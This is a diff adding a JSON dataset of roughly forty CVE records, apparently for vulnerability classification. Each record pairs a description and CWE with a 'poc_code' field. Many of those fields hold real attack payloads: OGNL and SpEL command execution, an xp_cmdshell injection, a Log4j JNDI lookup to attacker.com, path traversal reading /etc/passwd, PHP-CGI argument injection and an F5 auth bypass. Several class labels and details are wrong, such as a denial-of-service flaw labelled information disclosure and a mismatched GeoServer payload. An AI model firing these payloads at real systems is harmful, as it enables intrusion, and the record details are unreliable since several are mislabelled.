@@ -1,0 +1,371 @@
+[
+  {
+    "id": "CVE-2024-21683",
+    "description": "Atlassian Confluence Server Remote Code Execution via OGNL injection in template rendering",
+    "cvss_score": 9.8,
+    "cwe": "CWE-94",
+    "poc_code": "${(#rt = @java.lang.Runtime@getRuntime().exec('id'))}",
+    "affected_products": ["Confluence Server < 8.5.4"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2023-44487",
+    "description": "HTTP/2 Rapid Reset Attack allows denial of service through stream cancellation",
+    "cvss_score": 7.5,
+    "cwe": "CWE-400",
+    "poc_code": "Rapidly send HEADERS followed by RST_STREAM frames",
+    "affected_products": ["nginx", "Apache", "Node.js HTTP/2"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2023-34362",
+    "description": "MOVEit Transfer SQL injection vulnerability in web interface allowing RCE",
+    "cvss_score": 9.8,
+    "cwe": "CWE-89",
+    "poc_code": "'; EXEC xp_cmdshell 'whoami'--",
+    "affected_products": ["MOVEit Transfer < 2023.0.1"],
+    "class": "sqli"
+  },
+  {
+    "id": "CVE-2023-22515",
+    "description": "Atlassian Confluence broken access control allows creating admin accounts",
+    "cvss_score": 10.0,
+    "cwe": "CWE-284",
+    "poc_code": "POST /setup/setupadministrator.action with admin credentials",
+    "affected_products": ["Confluence Data Center 8.0-8.5.1"],
+    "class": "broken_auth"
+  },
+  {
+    "id": "CVE-2023-4966",
+    "description": "Citrix NetScaler sensitive information disclosure via buffer overflow in HTTP headers",
+    "cvss_score": 9.4,
+    "cwe": "CWE-119",
+    "poc_code": "Send oversized Host header to /oauth/idp/.well-known/openid-configuration",
+    "affected_products": ["NetScaler ADC", "NetScaler Gateway"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2024-3400",
+    "description": "PAN-OS GlobalProtect command injection in session handling",
+    "cvss_score": 10.0,
+    "cwe": "CWE-77",
+    "poc_code": "Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/hour/aaa`id`",
+    "affected_products": ["PAN-OS 10.2", "PAN-OS 11.0", "PAN-OS 11.1"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2021-44228",
+    "description": "Apache Log4j2 JNDI injection allows remote code execution via crafted log messages",
+    "cvss_score": 10.0,
+    "cwe": "CWE-502",
+    "poc_code": "${jndi:ldap://attacker.com/exploit}",
+    "affected_products": ["Apache Log4j 2.0-2.14.1"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2022-22965",
+    "description": "Spring4Shell: Spring Framework RCE via data binding to class loader",
+    "cvss_score": 9.8,
+    "cwe": "CWE-94",
+    "poc_code": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{c2}i",
+    "affected_products": ["Spring Framework 5.3.0-5.3.17"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2023-27524",
+    "description": "Apache Superset authentication bypass via default SECRET_KEY",
+    "cvss_score": 9.8,
+    "cwe": "CWE-1188",
+    "poc_code": "Forge session cookie using default key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET",
+    "affected_products": ["Apache Superset <= 2.0.1"],
+    "class": "broken_auth"
+  },
+  {
+    "id": "CVE-2024-0204",
+    "description": "GoAnywhere MFT authentication bypass allows admin account creation",
+    "cvss_score": 9.8,
+    "cwe": "CWE-425",
+    "poc_code": "POST /goanywhere/lic/accept with path traversal to InitialAccountSetup",
+    "affected_products": ["GoAnywhere MFT < 7.4.1"],
+    "class": "broken_auth"
+  },
+  {
+    "id": "CVE-2023-23397",
+    "description": "Microsoft Outlook privilege escalation via NTLM credential theft",
+    "cvss_score": 9.8,
+    "cwe": "CWE-294",
+    "poc_code": "Send calendar invite with UNC path in PidLidReminderFileParameter",
+    "affected_products": ["Microsoft Outlook"],
+    "class": "broken_auth"
+  },
+  {
+    "id": "CVE-2022-41040",
+    "description": "Microsoft Exchange Server SSRF leading to remote code execution (ProxyNotShell)",
+    "cvss_score": 8.8,
+    "cwe": "CWE-918",
+    "poc_code": "GET /autodiscover/autodiscover.json?@evil.com/powershell&Email=autodiscover/autodiscover.json",
+    "affected_products": ["Exchange Server 2013-2019"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2023-42793",
+    "description": "JetBrains TeamCity authentication bypass via /app/rest/users/id:1/tokens/RPC2",
+    "cvss_score": 9.8,
+    "cwe": "CWE-288",
+    "poc_code": "POST /app/rest/users/id:1/tokens/RPC2 without authentication",
+    "affected_products": ["TeamCity < 2023.05.4"],
+    "class": "broken_auth"
+  },
+  {
+    "id": "CVE-2021-21972",
+    "description": "VMware vCenter Server file upload RCE via vsphere-ui plugin",
+    "cvss_score": 9.8,
+    "cwe": "CWE-22",
+    "poc_code": "Upload JSP webshell via /ui/vropspluginui/rest/services/uploadova",
+    "affected_products": ["vCenter Server 6.5-7.0"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2024-23897",
+    "description": "Jenkins arbitrary file read via CLI argument parsing with @file expansion",
+    "cvss_score": 9.8,
+    "cwe": "CWE-22",
+    "poc_code": "java -jar jenkins-cli.jar who-am-i @/etc/passwd",
+    "affected_products": ["Jenkins <= 2.441"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2022-26134",
+    "description": "Confluence Server OGNL injection in URI allows unauthenticated RCE",
+    "cvss_score": 9.8,
+    "cwe": "CWE-917",
+    "poc_code": "GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%2C%27utf-8%27%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%27X-Cmd-Response%27%2C%23a%29%29%7D/",
+    "affected_products": ["Confluence Server 7.4-7.18"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2023-46604",
+    "description": "Apache ActiveMQ ClassInfo deserialization RCE via OpenWire protocol",
+    "cvss_score": 10.0,
+    "cwe": "CWE-502",
+    "poc_code": "ExceptionResponse with ClassInfo containing malicious class URL",
+    "affected_products": ["Apache ActiveMQ < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3"],
+    "class": "unsafe_deserialization"
+  },
+  {
+    "id": "CVE-2021-22205",
+    "description": "GitLab CE/EE unauthenticated RCE via ExifTool metadata handling",
+    "cvss_score": 10.0,
+    "cwe": "CWE-94",
+    "poc_code": "Upload image with embedded DjVu metadata containing command injection",
+    "affected_products": ["GitLab CE/EE 11.9-13.10.2"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2023-50164",
+    "description": "Apache Struts path traversal in file upload allows RCE",
+    "cvss_score": 9.8,
+    "cwe": "CWE-552",
+    "poc_code": "Manipulate file upload parameters to write JSP webshell outside upload dir",
+    "affected_products": ["Apache Struts 2.0.0-2.5.32, 6.0.0-6.3.0"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2024-1709",
+    "description": "ConnectWise ScreenConnect authentication bypass via setup wizard",
+    "cvss_score": 10.0,
+    "cwe": "CWE-288",
+    "poc_code": "Access /SetupWizard.aspx after initial setup to create new admin",
+    "affected_products": ["ScreenConnect <= 23.9.7"],
+    "class": "broken_auth"
+  },
+  {
+    "id": "CVE-2022-22963",
+    "description": "Spring Cloud Function RCE via SpEL injection in routing expression",
+    "cvss_score": 9.8,
+    "cwe": "CWE-94",
+    "poc_code": "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')",
+    "affected_products": ["Spring Cloud Function <= 3.1.6, <= 3.2.2"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2023-20198",
+    "description": "Cisco IOS XE Web UI privilege escalation allows creating local accounts",
+    "cvss_score": 10.0,
+    "cwe": "CWE-420",
+    "poc_code": "POST /webui/logoutconfirm.html?logon_hash=... to create admin account",
+    "affected_products": ["Cisco IOS XE with Web UI"],
+    "class": "broken_auth"
+  },
+  {
+    "id": "CVE-2021-41773",
+    "description": "Apache HTTP Server 2.4.49 path traversal via URL-encoded dots",
+    "cvss_score": 7.5,
+    "cwe": "CWE-22",
+    "poc_code": "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
+    "affected_products": ["Apache HTTP Server 2.4.49"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2023-28432",
+    "description": "MinIO information disclosure exposes environment variables including credentials",
+    "cvss_score": 7.5,
+    "cwe": "CWE-200",
+    "poc_code": "POST /minio/login with empty body returns MINIO_SECRET_KEY",
+    "affected_products": ["MinIO < RELEASE.2023-03-13"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2024-21762",
+    "description": "Fortinet FortiOS SSL VPN out-of-bounds write allows RCE",
+    "cvss_score": 9.6,
+    "cwe": "CWE-787",
+    "poc_code": "Crafted HTTP request to SSL VPN web portal triggers heap overflow",
+    "affected_products": ["FortiOS 7.4.0-7.4.2", "FortiOS 7.2.0-7.2.6"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2022-1388",
+    "description": "F5 BIG-IP iControl REST authentication bypass",
+    "cvss_score": 9.8,
+    "cwe": "CWE-306",
+    "poc_code": "Connection: X-F5-Auth-Token, X-F5-Auth-Token: (empty) bypasses auth",
+    "affected_products": ["BIG-IP 16.1.x-13.1.x"],
+    "class": "broken_auth"
+  },
+  {
+    "id": "CVE-2023-36884",
+    "description": "Microsoft Office HTML RCE via specially crafted documents",
+    "cvss_score": 8.3,
+    "cwe": "CWE-94",
+    "poc_code": "Embed OLE object linking to malicious HTML with scripting",
+    "affected_products": ["Microsoft Office 2016-2021", "Windows 10/11"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2021-26855",
+    "description": "Microsoft Exchange Server SSRF (ProxyLogon) allows pre-auth access",
+    "cvss_score": 9.8,
+    "cwe": "CWE-918",
+    "poc_code": "GET /owa/auth/x.js with X-AnonResource-Backend pointing to internal service",
+    "affected_products": ["Exchange Server 2013-2019"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2023-38831",
+    "description": "WinRAR code execution via crafted ZIP with spoofed file extension",
+    "cvss_score": 7.8,
+    "cwe": "CWE-345",
+    "poc_code": "Create ZIP with folder named 'doc.pdf ' containing malicious exe",
+    "affected_products": ["WinRAR < 6.23"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2024-27198",
+    "description": "JetBrains TeamCity auth bypass via alternative request path",
+    "cvss_score": 9.8,
+    "cwe": "CWE-288",
+    "poc_code": "GET /hax?jsp=/app/rest/server;.jsp returns server info without auth",
+    "affected_products": ["TeamCity < 2023.11.4"],
+    "class": "broken_auth"
+  },
+  {
+    "id": "CVE-2022-24112",
+    "description": "Apache APISIX RCE via batch-requests plugin abusing admin API",
+    "cvss_score": 9.8,
+    "cwe": "CWE-290",
+    "poc_code": "POST /apisix/batch-requests with pipeline targeting admin API",
+    "affected_products": ["Apache APISIX < 2.12.1"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2023-32315",
+    "description": "Openfire admin console authentication bypass via path traversal",
+    "cvss_score": 7.5,
+    "cwe": "CWE-22",
+    "poc_code": "GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp to access admin",
+    "affected_products": ["Openfire < 4.7.5"],
+    "class": "broken_auth"
+  },
+  {
+    "id": "CVE-2021-3156",
+    "description": "Sudo heap overflow (Baron Samedit) allows local privilege escalation",
+    "cvss_score": 7.8,
+    "cwe": "CWE-122",
+    "poc_code": "sudoedit -s '\\' $(python3 -c 'print(\"A\"*65536)')",
+    "affected_products": ["sudo 1.8.2-1.9.5p1"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2024-6387",
+    "description": "OpenSSH regreSSHion: race condition in signal handler allows RCE",
+    "cvss_score": 8.1,
+    "cwe": "CWE-362",
+    "poc_code": "Exploit race condition in SIGALRM handler during authentication timeout",
+    "affected_products": ["OpenSSH 8.5p1-9.7p1"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2023-29357",
+    "description": "Microsoft SharePoint Server privilege escalation via forged JWT tokens",
+    "cvss_score": 9.8,
+    "cwe": "CWE-287",
+    "poc_code": "Craft JWT with alg:none claiming SiteAdmin privileges",
+    "affected_products": ["SharePoint Server 2019"],
+    "class": "broken_auth"
+  },
+  {
+    "id": "CVE-2022-47966",
+    "description": "Zoho ManageEngine unauthenticated RCE via SAML SSO XML injection",
+    "cvss_score": 9.8,
+    "cwe": "CWE-502",
+    "poc_code": "Send crafted SAML response with serialized Java object",
+    "affected_products": ["ManageEngine multiple products"],
+    "class": "unsafe_deserialization"
+  },
+  {
+    "id": "CVE-2023-22527",
+    "description": "Atlassian Confluence template injection allows unauthenticated RCE",
+    "cvss_score": 10.0,
+    "cwe": "CWE-94",
+    "poc_code": "POST /template/aui/text-inline.vm with OGNL in label parameter",
+    "affected_products": ["Confluence Data Center 8.0-8.5.3"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2024-4577",
+    "description": "PHP CGI argument injection on Windows allows RCE",
+    "cvss_score": 9.8,
+    "cwe": "CWE-78",
+    "poc_code": "GET /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+    "affected_products": ["PHP 8.1-8.3 on Windows with CGI"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2023-25157",
+    "description": "GeoServer OGC filter SQL injection allows data exfiltration",
+    "cvss_score": 9.8,
+    "cwe": "CWE-89",
+    "poc_code": "GET /ows?service=WFS&request=GetPropertyValue&valueReference=exec(java.lang.Runtime,'id')",
+    "affected_products": ["GeoServer < 2.23.1"],
+    "class": "sqli"
+  },
+  {
+    "id": "CVE-2022-22954",
+    "description": "VMware Workspace ONE SSTI in catalog portal allows RCE",
+    "cvss_score": 9.8,
+    "cwe": "CWE-94",
+    "poc_code": "GET /catalog-portal/ui/oauth/verify?error=&deviceUdid=${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+    "affected_products": ["Workspace ONE Access 21.x"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2024-38077",
+    "description": "Windows Remote Desktop Licensing Service RCE via heap overflow",
+    "cvss_score": 9.8,
+    "cwe": "CWE-122",
+    "poc_code": "Send crafted license request to RDL service port 3389",
+    "affected_products": ["Windows Server 2012-2022"],
+    "class": "command_injection"
+  }
+]
